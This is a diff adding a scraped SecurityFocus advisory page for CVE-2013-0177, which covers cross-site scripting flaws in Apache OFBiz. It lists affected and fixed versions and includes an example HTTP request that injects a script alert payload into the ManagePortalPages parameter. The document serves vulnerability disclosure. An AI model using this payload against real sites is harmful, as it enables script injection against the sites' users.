@@ -1,0 +1,117 @@
+#SpeeDr00t@Black Falcon<br>#bid57463<p><b><span style="font-size: 18pt;">Apache OFBiz CVE-2013-0177 Multiple Cross Site Scripting Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/57463/info">info</a><br><a href="http://www.securityfocus.com/bid/57463/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/57463/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/57463/solution">solution</a><br><a href="http://www.securityfocus.com/bid/57463/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				57463
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2013-0177<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Jan 18 2013 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jan 18 2013 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Juan Caillava and Marcos Garcia 
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Apache OfBiz  11.4.1 <br/>
+					
+				
+					Apache OfBiz  10.4.4 <br/>
+					
+				
+					Apache OfBiz  10.4.3 <br/>
+					
+				
+					Apache OfBiz  10.4.2 <br/>
+					
+				
+					Apache OfBiz  10.4.1 <br/>
+					
+				
+					Apache OfBiz   10.04<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					Apache OfBiz  11.4.2 <br/>
+					
+				
+					Apache OfBiz  10.4.5 <br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	Attackers can exploit this issue by enticing an unsuspecting victim into following a malicious URI.<br/><br/>The following example request is available:<br/><br/>GET<br/>/exampleext/control/ManagePortalPages?parentPortalPageId=EXAMPLE"&amp;gt;&amp;lt;script&amp;gt;alert("xss")&amp;lt;/script&amp;gt;<br/>HTTP/1.1<br/>Host: www.example.com:8443<br/>User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:17.0) Gecko/20100101<br/>Firefox/17.0<br/>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br/>Accept-Language: es-ar,es;q=0.8,en-us;q=0.5,en;q=0.3<br/>Connection: keep-alive<br/>Referer: https://www.example.com:8443/exampleext/control/main?externalLoginKey=EL367731470037<br/>Cookie: JSESSIONID=C3E2C59FDC670DC004A562861681C092.jvm1; OFBiz.Visitor=10002
+	
+		<ul>
+</ul>
+</div>
